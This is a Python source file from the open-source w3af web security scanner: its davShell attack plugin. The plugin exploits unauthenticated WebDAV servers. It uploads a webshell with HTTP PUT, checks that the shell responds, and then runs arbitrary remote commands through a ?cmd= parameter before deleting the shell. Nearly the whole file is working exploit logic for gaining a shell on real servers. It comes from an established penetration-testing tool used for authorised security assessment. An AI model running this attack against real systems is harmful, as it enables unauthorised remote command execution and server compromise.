'''
davShell.py

Copyright 2006 Andres Riancho

This file is part of w3af, w3af.sourceforge.net .

w3af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w3af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w3af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

'''


from core.data.fuzzer.fuzzer import createRandAlpha
import core.controllers.outputManager as om
# options
from core.data.options.option import option
from core.data.options.optionList import optionList
from core.controllers.basePlugin.baseAttackPlugin import baseAttackPlugin

import core.data.kb.knowledgeBase as kb
import core.data.kb.vuln as vuln
from core.data.kb.exec_shell import exec_shell as exec_shell

import core.data.parsers.urlParser as urlParser
from core.controllers.w3afException import w3afException

import plugins.attack.payloads.shell_handler as shell_handler
import urllib


class davShell(baseAttackPlugin):
    '''
    Exploit web servers that have unauthenticated DAV access.
    @author: Andres Riancho ( andres.riancho@gmail.com )
    '''

    def __init__(self):
        baseAttackPlugin.__init__(self)
        
        # Internal variables
        self._exploit_url = None
        
        # User configured variables
        self._url = ''
        self._generateOnlyOne = True
        
    def fastExploit( self ):
        '''
        Exploits a web app with unauthenticated dav access.
        '''
        if self._url == '':
            om.out.error('You have to configure the "url" parameter.')
        else:
            v = vuln.vuln()
            v.setPluginName(self.getName())
            v.setURL( self._url )
            kb.kb.append( 'dav', 'dav', v )
    
    def getAttackType(self):
        '''
        @return: The type of exploit, SHELL, PROXY, etc.
        '''        
        return 'shell'
        
    def getVulnName2Exploit( self ):
        '''
        This method should return the vulnerability name (as saved in the kb) to exploit.
        For example, if the audit.osCommanding plugin finds an vuln, and saves it as:
        
        kb.kb.append( 'osCommanding' , 'osCommanding', vuln )
        
        Then the exploit plugin that exploits osCommanding ( attack.osCommandingShell ) should
        return 'osCommanding' in this method.
        '''        
        return 'dav'
    
    def _generateShell( self, vuln_obj ):
        '''
        @parameter vuln_obj: The vuln to exploit.
        @return: The shell object based on the vulnerability that was passed as a parameter.
        '''
        # Check if we really can execute commands on the remote server
        if self._verifyVuln( vuln_obj ):
            # Create the shell object
            shell_obj = davShellObj( vuln_obj )
            shell_obj.setUrlOpener( self._urlOpener )
            shell_obj.setExploitURL( self._exploit_url )
            return shell_obj
        else:
            return None

    def _verifyVuln( self, vuln_obj ):
        '''
        This command verifies a vuln. This is really hard work! :P

        @return : True if vuln can be exploited.
        '''
        # Create the shell
        filename = createRandAlpha( 7 )
        extension = urlParser.getExtension( vuln_obj.getURL() )
        
        # I get a list of tuples with file_content and extension to use
        shell_list = shell_handler.get_webshells( extension )
        
        for file_content, real_extension in shell_list:
            if extension == '':
                extension = real_extension
            om.out.debug('Uploading shell with extension: "'+extension+'".' )
            
            # Upload the shell
            url_to_upload = urlParser.urlJoin( vuln_obj.getURL() , filename + '.' + extension )
            om.out.debug('Uploading file: ' + url_to_upload )
            self._urlOpener.PUT( url_to_upload, data=file_content )
            
            # Verify if I can execute commands
            # All w3af shells, when invoked with a blank command, return a 
            # specific value in the response:
            # shell_handler.SHELL_IDENTIFIER
            response = self._urlOpener.GET( url_to_upload + '?cmd=' )
            if shell_handler.SHELL_IDENTIFIER in response.getBody():
                msg = 'The uploaded shell returned the SHELL_IDENTIFIER: "'
                msg += shell_handler.SHELL_IDENTIFIER + '".'
                om.out.debug( msg )
                self._exploit_url = url_to_upload + '?cmd='
                return True
            else:
                msg = 'The uploaded shell with extension: "'+extension
                msg += '" DIDN\'T returned what we expected, it returned: ' + response.getBody()
                om.out.debug( msg )
                extension = ''
    
    def getOptions( self ):
        '''
        @return: A list of option objects for this plugin.
        '''
        d1 = 'URL to exploit with fastExploit()'
        o1 = option('url', self._url, d1, 'string')
        
        d2 = 'Exploit only one vulnerability.'
        o2 = option('generateOnlyOne', self._generateOnlyOne, d2, 'boolean')
        
        ol = optionList()
        ol.add(o1)
        ol.add(o2)
        return ol

    def setOptions( self, optionsMap ):
        '''
        This method sets all the options that are configured using the user interface 
        generated by the framework using the result of getOptions().
        
        @parameter optionsMap: A dictionary with the options for the plugin.
        @return: No value is returned.
        ''' 
        self._url = optionsMap['url'].getValue()
        self._generateOnlyOne = optionsMap['generateOnlyOne'].getValue()

    def getPluginDeps( self ):
        '''
        @return: A list with the names of the plugins that should be runned before the
        current one.
        '''
        return ['discovery.serverHeader']

    def getRootProbability( self ):
        '''
        @return: This method returns the probability of getting a root shell using this attack plugin.
        This is used by the "exploit *" function to order the plugins and first try to exploit the more critical ones.
        This method should return 0 for an exploit that will never return a root shell, and 1 for an exploit that WILL ALWAYS
        return a root shell.
        '''
        return 0.8
        
    def getLongDesc( self ):
        '''
        @return: A DETAILED description of the plugin functions and features.
        '''
        return '''
        This plugin exploits webDAV misconfigurations and returns a shell. It's rather simple, using the dav method
        "PUT" the plugin uploads the corresponding webshell ( php, asp, etc. ) verifies that the shell is working, and if
        everything is working as expected the user can start typing commands.
        
        One configurable parameter exists:
            - URL (only used in fastExploit)
        '''
        
class davShellObj(exec_shell):
    def setExploitURL( self, eu ):
        self._exploit_url = eu
    
    def getExploitURL( self ):
        return self._exploit_url
        
    def execute( self, command ):
        '''
        This method executes a command in the remote operating system by
        exploiting the vulnerability.

        @parameter command: The command to handle ( ie. "ls", "whoami", etc ).
        @return: The result of the command.
        '''
        to_send = self.getExploitURL() + urllib.quote_plus( command )
        response = self._urlOpener.GET( to_send )
        return response.getBody()
    
    def end( self ):
        om.out.debug('davShellObj is going to delete the webshell that was uploaded before.')
        url_to_del = urlParser.uri2url( self._exploit_url )
        try:
            self._urlOpener.DELETE( url_to_del )
        except w3afException, e:
            om.out.error('davShellObj cleanup failed with exception: ' + str(e) )
        else:
            om.out.debug('davShellObj cleanup complete.')
        
    def getName( self ):
        return 'davShell'
